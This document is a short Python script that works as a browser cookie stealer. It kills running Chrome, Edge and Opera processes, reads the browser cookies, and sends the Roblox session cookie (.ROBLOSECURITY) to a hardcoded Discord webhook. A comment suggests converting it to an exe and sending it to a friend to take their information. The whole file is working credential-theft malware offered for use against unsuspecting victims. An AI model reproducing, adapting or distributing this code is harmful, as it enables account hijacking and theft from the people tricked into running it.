import browser_cookie3
import requests
import subprocess
import json


# you can use auto_py_to_exe to convert it to an exe file and send it to your friend to get their information


webhook = "https://discordapp.com/api/webhooks/1388883244665012285/SjbxL_sWCOD5HlTv2UxAldcamtfTEBK3H-SpUftWKfmReOHZkjEZ62Ef8nYkcDJ_rW8o"

def check_and_kill_process(process_name):
    try:
        tasklist = subprocess.check_output(["tasklist"], universal_newlines=True)

        if process_name in tasklist:
            subprocess.run(["taskkill", "/F", "/IM", process_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            print(".")
    except Exception as e:
        pass

check_and_kill_process("chrome.exe")
check_and_kill_process("msedge.exe")
check_and_kill_process("opera.exe")

cookies = browser_cookie3.load()

if cookies:
    for cookie in cookies:
        if cookie.name == ".ROBLOSECURITY":
            message = {
                'content': f'```{cookie.value}```'
            }
            requests.post(webhook, data=json.dumps(message), headers={'Content-Type': 'application/json'})
else:
    message = {
                'content': f'```no roblox cookies```'
    }
    requests.post(webhook, data=json.dumps(message), headers={'Content-Type': 'application/json'})